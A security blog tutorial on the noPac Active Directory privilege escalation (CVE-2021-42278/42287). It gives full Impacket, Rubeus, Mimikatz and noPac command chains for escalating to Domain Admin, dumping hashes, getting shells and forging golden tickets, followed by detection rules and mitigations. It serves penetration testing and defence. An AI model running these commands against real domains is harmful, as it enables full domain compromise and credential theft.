---
title: "sAMAccountName Spoofing: From Domain User to Domain Admin (CVE-2021-42278 & CVE-2021-42287)"
date: 2026-03-18 13:00:00 +0200
categories: [Active Directory, Privilege Escalation]
tags: [active-directory, kerberos, cve, red-team, windows, nopac, impacket, privilege-escalation, domain-admin]
description: "A deep technical walkthrough of the noPac attack chain — abusing CVE-2021-42278 and CVE-2021-42287 to escalate from any domain user to Domain Admin."
image:
  path: /assets/img/posts/samaccountname-spoofing/banner.png
  alt: "sAMAccountName Spoofing — CVE-2021-42278 & CVE-2021-42287"
---

> **Disclaimer:** This post is written strictly for educational and authorized penetration testing purposes. Exploiting these vulnerabilities against systems you do not own or have explicit written permission to test is illegal. Always operate within the scope of an authorized engagement.
{: .prompt-warning }

---

## Overview

In November 2021, Microsoft patched two critical Active Directory vulnerabilities that, when chained together, allow any low-privileged domain user to escalate to **Domain Admin** in a matter of minutes — with nothing more than a valid username and password.

| CVE | Name | CVSS | Component |
|---|---|---|---|
| CVE-2021-42278 | SAM Name Impersonation | 7.5 | Active Directory Domain Services |
| CVE-2021-42287 | KDC Bamboozling | 7.5 | Kerberos KDC / PAC |

The combined attack is commonly known as **noPac** (short for **no PAC**, because the vulnerability involves ticket manipulation without a PAC) or **sAMAccountName Spoofing**.

**Impact:** Any authenticated domain user → Domain Admin → Full domain compromise.

---

## Background: Key Concepts

Before diving into the exploit, you need to understand a handful of Active Directory and Kerberos primitives.

### sAMAccountName

The `sAMAccountName` attribute is the pre-Windows 2000 logon name for an AD object. It uniquely identifies users and computers within a domain:

- **User accounts:** `john.doe`
- **Computer accounts:** `WORKSTATION01$` (always ends with `$`)

The trailing `$` is a **convention**, not a technically enforced constraint — and that is exactly the problem.

### MachineAccountQuota (ms-DS-MachineAccountQuota)

By default, every domain user can create **up to 10 computer accounts** in Active Directory. This is controlled by the domain-level attribute `ms-DS-MachineAccountQuota` (default value: `10`).

The creator of a computer account is automatically granted write permissions over that account's attributes, including `sAMAccountName` and `servicePrincipalName`.

### Kerberos S4U2Self

S4U (Service for User) is a Kerberos protocol extension that allows a service to request a service ticket on behalf of any user — including an administrator — without needing their credentials. The `S4U2Self` extension lets a service request a ticket to itself for any user.

### Privilege Attribute Certificate (PAC)

A PAC is a Microsoft extension embedded in Kerberos tickets that carries user authorization data (group memberships, privileges). The KDC embeds the requestor's identity in the PAC so it can verify ticket ownership later.

---

## The Vulnerabilities Explained

### CVE-2021-42278 — SAM Name Impersonation

Active Directory **does not validate** that a computer account's `sAMAccountName` ends with a `$` character. This means any user who controls a computer account (e.g., one they created via MachineAccountQuota) can rename it to anything — **including the name of a Domain Controller, without the trailing `$`**.

```
DC sAMAccountName:  DC01$
Attacker renames:   DC01    <-- no $ sign, AD allows this
```

The KDC uses `sAMAccountName` to look up accounts during ticket issuance. Naming your fake computer account `DC01` creates ambiguity with `DC01$`.

### CVE-2021-42287 — KDC Bamboozling

When a service ticket is requested via S4U2Self and the KDC **cannot find** the account referenced in the TGT, it **automatically appends a `$`** and tries again.

The attack sequence exploits this fallback behavior:

1. Attacker has a TGT issued for `DC01` (their renamed computer account).
2. Attacker renames the computer account back to `ControlledComputer$`.
3. Now there is **no account named `DC01`** in AD.
4. Attacker requests a service ticket via S4U2Self, impersonating `Administrator`.
5. The KDC cannot find `DC01`, appends `$`, finds `DC01$` (the real Domain Controller).
6. The KDC issues a service ticket **as if it came from the Domain Controller**, for the Administrator.
7. **Full domain compromise.**

---

## Attack Flow Diagram

```
[Low-Priv User]
      |
      | (1) Create computer account: ControlledComputer$
      |
      | (2) Clear SPNs on ControlledComputer$
      |
      | (3) Rename sAMAccountName: ControlledComputer$ --> DC01
      |         (CVE-2021-42278: no validation on missing $)
      |
      | (4) Request TGT for "DC01" (our fake computer)
      |         KDC issues TGT with requestor = DC01
      |
      | (5) Rename sAMAccountName back: DC01 --> ControlledComputer$
      |         Now NO account named "DC01" exists
      |
      | (6) S4U2Self: request ST impersonating Administrator
      |         KDC: can't find "DC01", tries "DC01$" --> real DC!
      |         (CVE-2021-42287: KDC fallback appends $)
      |         KDC issues ST for Administrator @ DC01$
      |
      v
[Domain Admin Service Ticket]
      |
      | (7) DCSync / secretsdump --> dump NTLM hashes
      |
      v
[Full Domain Compromise]
```

---

## Prerequisites

Before exploitation, verify the following requirements are met:

| Requirement | Details | Default |
|---|---|---|
| Valid domain user credentials | Username + password (or hash) | Required |
| `ms-DS-MachineAccountQuota > 0` | Allows creating computer accounts | 10 (default) |
| DC missing Nov 2021 patches | KB5008102, KB5008380, KB5008602 | Unpatched = vulnerable |
| Network access to DC | TCP 88 (Kerberos), 389/636 (LDAP), 445 (SMB) | Required |

### Check MachineAccountQuota

**Linux (netexec/crackmapexec):**
```bash
# Using netexec
netexec ldap 10.10.10.10 -u username -p 'Password123' -d 'domain.local' --kdcHost 10.10.10.10 -M MAQ

# Using ldapsearch
ldapsearch -x -H ldap://10.10.10.10 -D "CN=username,CN=Users,DC=domain,DC=local" \
  -w 'Password123' -b "DC=domain,DC=local" \
  "(objectClass=domain)" ms-DS-MachineAccountQuota
```

**Windows (PowerShell):**
```powershell
# Using RSAT
(Get-ADDomain).MachineAccountQuota

# Alternative with PowerView
Get-DomainObject -Identity "DC=domain,DC=local" | Select-Object ms-ds-machineaccountquota
```

### Check if DC is Vulnerable

**Linux:**
```bash
# netexec noPac module
netexec smb 10.10.10.10 -u 'username' -p 'Password123' -d 'domain.local' -M nopac
```

**Windows (Rubeus):**
```powershell
# Requesting a TGT with /nopac switch — if the ticket is smaller than usual, DC is vulnerable
Rubeus.exe asktgt /user:"lowprivuser" /password:"Password123" /domain:"domain.local" /dc:"DC01.domain.local" /nopac /nowrap
```

> A TGT without a PAC is significantly smaller in size. If Rubeus returns a small ticket, the DC is unpatched.
{: .prompt-tip }

---

## Exploitation — Linux (Impacket)

This section covers the full manual exploitation chain using Impacket tools on Kali Linux or any UNIX-like system.

### Install Required Tools

```bash
# Clone and install the latest Impacket (with noPac-related PRs merged)
git clone https://github.com/SecureAuthCorp/impacket
cd impacket
pip3 install .

# Clone krbrelayx (for addspn.py)
git clone https://github.com/dirkjanm/krbrelayx
cd krbrelayx
pip3 install .
```

### Step 0 — Create a Controlled Computer Account

```bash
addcomputer.py \
  -computer-name 'ControlledComputer$' \
  -computer-pass 'ComputerPassword123!' \
  -dc-host DC01.domain.local \
  -domain-netbios domain \
  'domain.local/lowprivuser:UserPassword123'
```

> Verify creation: `net rpc group members "Domain Computers" -U domain/lowprivuser%UserPassword123 -S 10.10.10.10`
{: .prompt-tip }

### Step 1 — Clear the SPNs

By default, when a computer account is created via LDAP, it has SPNs like `host/ControlledComputer.domain.local`. These must be removed because the rename operation will fail if SPNs still reference the old name.

> **Note:** When using `addcomputer.py` with the default SAMR method, SPNs are not added, so this step may be skippable. Always verify.
{: .prompt-info }

```bash
# Check existing SPNs
python3 addspn.py \
  -u 'domain\lowprivuser' \
  -p 'UserPassword123' \
  -t 'ControlledComputer$' \
  --list \
  DC01.domain.local

# Clear all SPNs
python3 addspn.py \
  --clear \
  -t 'ControlledComputer$' \
  -u 'domain\lowprivuser' \
  -p 'UserPassword123' \
  DC01.domain.local
```

### Step 2 — Rename sAMAccountName to Match the DC

This is where CVE-2021-42278 is triggered. We rename our controlled computer account to match the Domain Controller's name, without the trailing `$`.

```bash
renameMachine.py \
  -current-name 'ControlledComputer$' \
  -new-name 'DC01' \
  -dc-ip '10.10.10.10' \
  'domain.local'/'lowprivuser':'UserPassword123'
```

**Verify the rename was successful:**
```bash
python3 /path/to/impacket/examples/GetADUsers.py \
  -all domain.local/lowprivuser:UserPassword123 \
  -dc-ip 10.10.10.10 | grep -i DC01
```

### Step 3 — Request a TGT for the Spoofed Account

Request a Ticket Granting Ticket for `DC01` (our renamed computer account). The KDC will issue a TGT because it currently sees `DC01` as a valid account.

```bash
getTGT.py \
  -dc-ip '10.10.10.10' \
  'domain.local'/'DC01':'ComputerPassword123!'

# This creates: DC01.ccache
ls -la DC01.ccache
```

### Step 4 — Rename the Account Back

This is the crucial step that enables CVE-2021-42287 to trigger. By renaming the account away from `DC01`, we create a situation where the TGT refers to `DC01` but **no account with that name exists**.

```bash
renameMachine.py \
  -current-name 'DC01' \
  -new-name 'ControlledComputer$' \
  -dc-ip '10.10.10.10' \
  'domain.local'/'lowprivuser':'UserPassword123'
```

### Step 5 — Request a Service Ticket via S4U2Self

Using the TGT for `DC01` (which no longer exists), request a service ticket for CIFS on the actual Domain Controller, impersonating the `Administrator`. The KDC will search for `DC01`, fail, append `$`, find `DC01$` (the real DC), and issue the ticket.

```bash
KRB5CCNAME='DC01.ccache' getST.py \
  -self \
  -impersonate 'Administrator' \
  -altservice 'cifs/DC01.domain.local' \
  -k \
  -no-pass \
  -dc-ip '10.10.10.10' \
  'domain.local'/'DC01'

# Output: Administrator.ccache
ls -la Administrator.ccache
```

> If you want LDAP access instead of CIFS (for secretsdump/DCSync), use `-altservice 'ldap/DC01.domain.local'`
{: .prompt-tip }

### Step 6 — DCSync / Dump Hashes

With the service ticket for Administrator, perform a DCSync to dump all domain hashes:

```bash
# DCSync for krbtgt (for golden ticket persistence)
KRB5CCNAME='Administrator.ccache' secretsdump.py \
  -just-dc-user 'krbtgt' \
  -k \
  -no-pass \
  -dc-ip '10.10.10.10' \
  @'DC01.domain.local'

# DCSync for all users
KRB5CCNAME='Administrator.ccache' secretsdump.py \
  -just-dc \
  -k \
  -no-pass \
  -dc-ip '10.10.10.10' \
  @'DC01.domain.local'

# Get a shell on the DC (psexec with ccache)
KRB5CCNAME='Administrator.ccache' psexec.py \
  -k \
  -no-pass \
  'domain.local/Administrator@DC01.domain.local'
```

---

## Exploitation — Automated (noPac)

For a one-command exploitation approach, [cube0x0's noPac](https://github.com/cube0x0/noPac) tool automates the entire chain.

### Install noPac (Linux)

```bash
git clone https://github.com/Ridter/noPac
cd noPac
pip3 install -r requirements.txt
```

> There are two notable noPac implementations: [cube0x0/noPac](https://github.com/cube0x0/noPac) (C#) and [Ridter/noPac](https://github.com/Ridter/noPac) (Python). Both work reliably.
{: .prompt-info }

### Scan (Check Vulnerability)

```bash
# Python version
python3 scanner.py domain.local/lowprivuser:Password123 -dc-ip 10.10.10.10

# If the DC returns a TGT without PAC (smaller ticket), it's vulnerable
```

### Full Exploit (Dump & Shell)

```bash
# Dump hashes
python3 noPac.py domain.local/lowprivuser:Password123 \
  -dc-ip 10.10.10.10 \
  --impersonate Administrator \
  -dump

# Semi-interactive shell on DC
python3 noPac.py domain.local/lowprivuser:Password123 \
  -dc-ip 10.10.10.10 \
  --impersonate Administrator \
  -shell
```

---

## Exploitation — Windows (Rubeus + PowerView + Powermad)

This section covers exploitation from a Windows machine using pure PowerShell / C# tooling.

### Required Tools

| Tool | Source | Purpose |
|---|---|---|
| Powermad | [GitHub](https://github.com/Kevin-Robertson/Powermad) | Create machine accounts, modify attributes |
| PowerView | [GitHub](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration, clear SPNs |
| Rubeus | [GitHub](https://github.com/GhostPack/Rubeus) | Kerberos ticket manipulation |
| Mimikatz | [GitHub](https://github.com/gentilkiwi/mimikatz) | DCSync / credential dumping |

### Full PowerShell Attack Chain

```powershell
#region --- Setup ---
klist purge  # Clear existing cached tickets

# Import modules
Import-Module "$env:USERPROFILE\Downloads\Powermad\Powermad.ps1"
Import-Module "$env:USERPROFILE\Downloads\PowerSploit\Recon\PowerView.ps1"

# If running from an unauthenticated context, set up credentials
$Password = ConvertTo-SecureString 'UserPassword123' -AsPlainText -Force
[pscredential]$Creds = New-Object System.Management.Automation.PSCredential ("DOMAIN\lowprivuser", $Password)
#endregion

#region --- Step 0: Create Computer Account ---
Write-Host "[*] Creating new computer account..."
$CompPass = ConvertTo-SecureString 'ComputerPassword123!' -AsPlainText -Force

New-MachineAccount `
  -MachineAccount "ControlledComputer" `
  -Password $CompPass `
  -Domain "domain.local" `
  -DomainController "DC01.domain.local" `
  -Credential $Creds `
  -Verbose
#endregion

#region --- Step 1: Clear SPNs ---
Write-Host "[*] Clearing SPNs from computer account..."

Set-DomainObject `
  -Identity "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" `
  -Clear 'serviceprincipalname' `
  -Server "DC01.domain.local" `
  -Credential $Creds `
  -Domain "domain.local" `
  -Verbose
#endregion

#region --- Step 2: Rename sAMAccountName to DC ---
Write-Host "[*] Renaming sAMAccountName to DC01 (CVE-2021-42278)..."

Set-MachineAccountAttribute `
  -MachineAccount "ControlledComputer" `
  -Value "DC01" `
  -Attribute samaccountname `
  -Credential $Creds `
  -Domain "domain.local" `
  -DomainController "DC01.domain.local" `
  -Verbose
#endregion

#region --- Step 3: Get TGT ---
Write-Host "[*] Requesting TGT for spoofed account DC01..."

.\Rubeus.exe asktgt `
  /user:"DC01" `
  /password:"ComputerPassword123!" `
  /domain:"domain.local" `
  /dc:"DC01.domain.local" `
  /outfile:kerberos.tgt.kirbi
#endregion

#region --- Step 4: Reset sAMAccountName ---
Write-Host "[*] Resetting sAMAccountName back (CVE-2021-42287 prep)..."

Set-MachineAccountAttribute `
  -MachineAccount "ControlledComputer" `
  -Value "ControlledComputer$" `
  -Attribute samaccountname `
  -Credential $Creds `
  -Domain "domain.local" `
  -DomainController "DC01.domain.local" `
  -Verbose
#endregion

#region --- Step 5: S4U2Self — Get CIFS ticket as Administrator ---
Write-Host "[*] Requesting service ticket (S4U2Self) impersonating Administrator..."

.\Rubeus.exe s4u `
  /self `
  /impersonateuser:"Administrator" `
  /altservice:"cifs/DC01.domain.local" `
  /dc:"DC01.domain.local" `
  /ptt `
  /ticket:kerberos.tgt.kirbi
#endregion

#region --- Step 6a: Verify access ---
Write-Host "[*] Verifying access to DC admin share..."
Get-ChildItem \\DC01.domain.local\c$
#endregion

#region --- Step 6b: DCSync via LDAP ticket ---
Write-Host "[*] Getting LDAP ticket for DCSync..."

.\Rubeus.exe s4u `
  /self `
  /impersonateuser:"Administrator" `
  /altservice:"ldap/DC01.domain.local" `
  /dc:"DC01.domain.local" `
  /ptt `
  /ticket:kerberos.tgt.kirbi

Write-Host "[*] Running DCSync for krbtgt via Mimikatz..."

.\mimikatz.exe `
  "kerberos::list" `
  "lsadump::dcsync /domain:domain.local /kdc:DC01.domain.local /user:krbtgt" `
  exit
#endregion
```

---

## Exploitation — C# noPAC (Windows)

For a fully automated Windows attack, use the C# `noPAC` tool compiled from [cube0x0/noPac](https://github.com/cube0x0/noPac):

```powershell
# Scan for vulnerability
noPAC.exe scan -domain domain.local -user lowprivuser -pass Password123

# Full exploit — dump hashes
noPAC.exe -domain domain.local -user lowprivuser -pass Password123 /dc DC01.domain.local /mAccount ControlledComputer /mPassword CompPassword123 /service cifs /ptt

# Via PowerShell wrapper (Invoke-noPAC)
Import-Module .\Invoke-noPAC.ps1
Invoke-noPAC -command "scan -domain domain.local -user lowprivuser -pass Password123"
```

---

## Post-Exploitation

Once you have Domain Admin access or domain hashes, the following post-exploitation options are available:

### Golden Ticket (Persistence)

With the `krbtgt` hash from DCSync, you can forge Golden Tickets for long-term persistence — valid for 10 years by default:

**Linux:**
```bash
# Using lookupsid to get domain SID
lookupsid.py domain.local/lowprivuser:Password123@DC01.domain.local

# Forge golden ticket
ticketer.py \
  -nthash <KRBTGT_NTLM_HASH> \
  -domain-sid <DOMAIN_SID> \
  -domain domain.local \
  Administrator

# Use it
KRB5CCNAME=Administrator.ccache python3 psexec.py -k -no-pass domain.local/Administrator@DC01.domain.local
```

**Windows (Mimikatz):**
```powershell
# Create golden ticket and inject into current session
kerberos::golden /user:Administrator /domain:domain.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt
```

### Pass-the-Hash / PTH

With any dumped NTLM hash:
```bash
# Remote shell via PtH
psexec.py -hashes :<NTLM_HASH> domain.local/Administrator@DC01.domain.local

# WMI execution
wmiexec.py -hashes :<NTLM_HASH> domain.local/Administrator@DC01.domain.local
```

### Dump All Domain Credentials

```bash
KRB5CCNAME='Administrator.ccache' secretsdump.py \
  -just-dc \
  -k \
  -no-pass \
  @'DC01.domain.local' \
  -outputfile domain_hashes
```

---

## Detection

### Windows Event IDs to Monitor

| Event ID | Log | Description |
|---|---|---|
| **4741** | Security | Computer account was created |
| **4742** | Security | Computer account was changed |
| **4781** | Security | The name of an account was changed |
| **35** | System (KDC) | PAC without attributes |
| **36** | System (KDC) | Ticket without a PAC |
| **37** | System (KDC) | Ticket without Requestor |
| **38** | System (KDC) | Requestor Mismatch |
| **16990** | System (SAMADS) | Object class and UserAccountControl validation failure |
| **16991** | System (SAMADS) | SAM Account Name validation failure |

### Key Detection Patterns

The core anomaly to detect is: **a computer account is renamed from `something$` to `something` (without the `$`)**. In Windows event logs, this appears as:

```
Event ID 4781:
  OldTargetUserName: ControlledComputer$
  NewTargetUserName: DC01            <-- no trailing $, SUSPICIOUS
```

### Splunk SPL Detection Query

```spl
index=windows (EventCode=4742) OR (EventCode=4781)
| eventstats values(Security_ID), values(EventCode) as EventCode by Logon_ID
| search EventCode=4742
| rex field=_raw "(Message=(?<Message>[a-zA-z ].*))"
| eval datetime=strftime(_time, "%m-%d-%Y %H:%M:%S.%Q")
| stats count values(datetime), values(Old_Account_Name), values(New_Account_Name),
        values(EventCode), values(MSADChangedAttributes), values(Message),
        values(Account_Domain), values(Security_ID), values(SAM_Account_Name) by Logon_ID
| search count >= 2
| rename values(*) as *
| eval Effecting_Account = mvindex(Security_ID, 1)
| eval Computer_Account_Impacted = mvindex(Security_ID, 0)
| table datetime, Account_Domain, Effecting_Account, Logon_ID,
         Computer_Account_Impacted, Message, MSADChangedAttributes,
         New_Account_Name, Old_Account_Name, EventCode
```

### Sigma Rule

```yaml
title: sAMAccountName Spoofing Attack (CVE-2021-42278)
id: 7a7c01c5-1234-4abc-8765-abcdef123456
status: stable
description: >
  Detects a machine account being renamed to remove the trailing '$',
  indicating a potential sAMAccountName spoofing attack (CVE-2021-42278).
references:
  - https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/
  - https://github.com/cube0x0/noPac
author: Security Research
date: 2021/12/12
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4781
    OldTargetUserName|endswith: '$'
  filter:
    NewTargetUserName|endswith: '$'
  condition: selection and not filter
falsepositives:
  - Legitimate administrative renaming of computer accounts (rare)
level: high
tags:
  - attack.privilege_escalation
  - attack.t1068
  - cve.2021.42278
```

### Elastic Detection Query (KQL)

```kql
event.code:"4781" and
winlog.event_data.OldTargetUserName:*$ and
not winlog.event_data.NewTargetUserName:*$
```

### PowerShell Audit Script (Check All DCs)

```powershell
<#
  .SYNOPSIS
    Check all Domain Controllers for CVE-2021-42287/42278 exploitation events
#>
$EventIds = @{
    35     = "PAC without attributes"
    36     = "Ticket without a PAC"
    37     = "Ticket without Requestor"
    38     = "Requestor Mismatch"
    16990  = "Object class and UserAccountControl validation failure"
    16991  = "SAM Account Name validation failure"
}

$DomainControllers = Get-ADDomain | Select-Object -ExpandProperty ReplicaDirectoryServers

foreach ($DC in $DomainControllers) {
    Write-Host "[*] Checking $DC ..."
    $Events = Invoke-Command -ComputerName $DC -ScriptBlock {
        param([hashtable]$EventIds)
        Get-WinEvent -EA SilentlyContinue -FilterHashtable @{
            LogName = 'System'
            Id      = ($EventIds.Keys)
        } | Where-Object {
            $_.ProviderName -in @(
                'Microsoft-Windows-Kerberos-Key-Distribution-Center',
                'Microsoft-Windows-Directory-Services-SAM'
            )
        }
    } -ArgumentList $EventIds

    foreach ($Event in $Events) {
        [PSCustomObject]@{
            DC         = $DC
            TimeCreated = $Event.TimeCreated
            EventID    = $Event.Id
            EventGroup = $EventIds[$Event.Id]
            Message    = ($Event.Message -split "`n")[0]
        }
    }
}
```

---

## Mitigation & Remediation

### Immediate Actions

| Priority | Action | How |
|---|---|---|
| **Critical** | Apply November 2021 patches | KB5008102 (CVE-2021-42278), KB5008380 (CVE-2021-42287), KB5008602 |
| **High** | Enable enforcement mode | Set `PacRequestorEnforcement = 2` on all DCs |
| **High** | Set MachineAccountQuota to 0 | Prevent domain users from creating computer accounts |
| **Medium** | Audit existing machine accounts | Look for accounts named like DCs without `$` |
| **Low** | Enable enhanced AD auditing | DS Access, Account Management audit policies |

### Patch the Domain Controllers

Install the following updates on **all Domain Controllers**:

```
CVE-2021-42278: KB5008102
CVE-2021-42287: KB5008380
Additional:     KB5008602
```

Check patch status via PowerShell:
```powershell
# Check if patch is installed on all DCs
$DCs = (Get-ADDomain).ReplicaDirectoryServers
foreach ($dc in $DCs) {
    $patches = Invoke-Command -ComputerName $dc -ScriptBlock {
        Get-HotFix | Where-Object { $_.HotFixID -in @("KB5008102","KB5008380","KB5008602") }
    }
    Write-Host "DC: $dc | Patches: $($patches.HotFixID -join ', ')"
}
```

### Enable PAC Requestor Enforcement Mode

After patching, enforce the new PAC behavior via registry:

```powershell
# Set on each DC (PacRequestorEnforcement = 2 = Enforcement mode)
# 0 = Disabled, 1 = Audit only, 2 = Enforced
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
  -Name "PacRequestorEnforcement" `
  -Value 2 `
  -Type DWord
```

> Microsoft automatically enabled Enforcement mode on **July 12, 2022** via Windows Update. Ensure your DCs have updates applied past that date.
{: .prompt-info }

### Set MachineAccountQuota to 0

This prevents any non-admin user from creating computer accounts:

```powershell
# Using PowerShell / RSAT
Set-ADDomain -Identity "domain.local" -Replace @{"ms-DS-MachineAccountQuota"="0"}

# Verify
Get-ADObject (Get-ADDomain).DistinguishedName -Properties ms-DS-MachineAccountQuota |
  Select-Object ms-DS-MachineAccountQuota
```

**Via ADSI Edit:**
1. Open `adsiedit.msc`
2. Connect to Default Naming Context
3. Right-click domain root → Properties
4. Find `ms-DS-MachineAccountQuota` → Set to `0`

### Additional Hardening

```powershell
# Require domain admin to create computer accounts (delegation via GPO is safer)
# Block non-admin computer account creation via Group Policy:
# Computer Configuration > Windows Settings > Security Settings >
# Local Policies > User Rights Assignment >
# Remove "Add workstations to domain" from Authenticated Users

# Enable fine-grained auditing for directory services
AuditPol /set /subcategory:"Computer Account Management" /success:enable /failure:enable
AuditPol /set /subcategory:"Directory Service Changes" /success:enable /failure:enable
AuditPol /set /subcategory:"Kerberos Service Ticket Operations" /success:enable /failure:enable
AuditPol /set /subcategory:"Kerberos Authentication Service" /success:enable /failure:enable
```

---

## MITRE ATT&CK Mapping

| Tactic | Technique | Sub-Technique | ID |
|---|---|---|---|
| Privilege Escalation | Exploitation for Privilege Escalation | — | [T1068](https://attack.mitre.org/techniques/T1068/) |
| Privilege Escalation | Valid Accounts | Domain Accounts | [T1078.002](https://attack.mitre.org/techniques/T1078/002/) |
| Credential Access | OS Credential Dumping | DCSync | [T1003.006](https://attack.mitre.org/techniques/T1003/006/) |
| Defense Evasion | Valid Accounts | — | [T1078](https://attack.mitre.org/techniques/T1078/) |
| Persistence | Account Manipulation | — | [T1098](https://attack.mitre.org/techniques/T1098/) |

---

## Vulnerable Versions

The following Windows Server versions are affected if **not patched** with November 2021 updates:

| OS Version | Vulnerable | Fixed By |
|---|---|---|
| Windows Server 2022 | Yes | KB5007205 / Nov 2021 CU |
| Windows Server 2019 | Yes | KB5007206 / Nov 2021 CU |
| Windows Server 2016 | Yes | KB5007192 / Nov 2021 CU |
| Windows Server 2012 R2 | Yes | KB5007247 / Nov 2021 CU |
| Windows Server 2012 | Yes | KB5007246 / Nov 2021 CU |
| Windows Server 2008 R2 | Yes | KB5007233 / Nov 2021 CU |

---

## Tool Reference

| Tool | Platform | GitHub | Purpose |
|---|---|---|---|
| Impacket suite | Linux | [SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket) | addcomputer, getTGT, getST, secretsdump |
| krbrelayx | Linux | [dirkjanm/krbrelayx](https://github.com/dirkjanm/krbrelayx) | addspn.py |
| noPac (Python) | Linux | [Ridter/noPac](https://github.com/Ridter/noPac) | Automated Python exploit |
| noPac (C#) | Windows | [cube0x0/noPac](https://github.com/cube0x0/noPac) | Automated C# exploit |
| Rubeus | Windows | [GhostPack/Rubeus](https://github.com/GhostPack/Rubeus) | Kerberos ticket manipulation |
| Powermad | Windows | [Kevin-Robertson/Powermad](https://github.com/Kevin-Robertson/Powermad) | Machine account creation/attribute edit |
| PowerView | Windows | [PowerShellMafia/PowerSploit](https://github.com/PowerShellMafia/PowerSploit) | AD enumeration, SPN clearing |
| Mimikatz | Windows | [gentilkiwi/mimikatz](https://github.com/gentilkiwi/mimikatz) | DCSync, credential dumping |
| netexec | Linux | [Pennyw0rth/NetExec](https://github.com/Pennyw0rth/NetExec) | Scanning, initial recon |

---

## Summary

The noPac / sAMAccountName Spoofing attack chain is one of the most impactful Active Directory privilege escalation techniques ever discovered. It is:

- **Trivially easy:** Exploitable by any authenticated domain user with 6 commands
- **High impact:** Goes from low-priv user to Domain Admin in under 2 minutes
- **Hard to detect without proper logging:** No outbound traffic anomalies in older setups
- **Fully patched** if KB5008102 + KB5008380 are applied and `PacRequestorEnforcement = 2`

The core takeaways for defenders:

1. **Patch your DCs** — this is a 10-second fix that eliminates the vulnerability entirely
2. **Set `ms-DS-MachineAccountQuota = 0`** — reduces your attack surface dramatically
3. **Monitor Event IDs 4741, 4742, 4781** — especially for accounts being renamed to drop the `$`
4. **Enable Kerberos audit logging** on all DCs

---

## References

- [Microsoft KB5008102 — CVE-2021-42278](https://support.microsoft.com/en-us/topic/kb5008102-active-directory-security-accounts-manager-hardening-changes-cve-2021-42278-5975b463-4c95-45e1-831a-d120004e258e)
- [Microsoft KB5008380 — CVE-2021-42287](https://support.microsoft.com/en-us/topic/kb5008380-authentication-updates-cve-2021-42287-9dafac11-e0d0-4cb8-959a-143bd0201041)
- [The Hacker Recipes — sAMAccountName Spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
- [Cloudbrothers — Exploit Kerberos sAMAccountName Spoofing](https://cloudbrothers.info/en/exploit-kerberos-samaccountname-spoofing/)
- [Pentestlab — Domain Escalation sAMAccountName Spoofing](https://pentestlab.blog/2022/01/10/domain-escalation-samaccountname-spoofing/)
- [TrustedSec — Attack Path Mapping CVE-2021-42287 & 42278](https://trustedsec.com/blog/an-attack-path-mapping-approach-to-cves-2021-42287-and-2021-42278)
- [Swisskyrepo — InternalAllTheThings: NoPAC](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/CVE/NoPAC/)
- [Hacking Articles — Windows Privilege Escalation: sAMAccountName Spoofing](https://www.hackingarticles.in/windows-privilege-escalation-samaccountname-spoofing/)
- [SentinelOne — CVE-2021-42278 Database](https://www.sentinelone.com/vulnerability-database/cve-2021-42278/)
- [cube0x0/noPac — GitHub](https://github.com/cube0x0/noPac)
- [MITRE ATT&CK — T1068](https://attack.mitre.org/techniques/T1068/)
- [Elastic Detection Rule — SamAccountName Spoofing](https://www.elastic.co/guide/en/security/8.19/potential-privileged-escalation-via-samaccountname-spoofing.html)
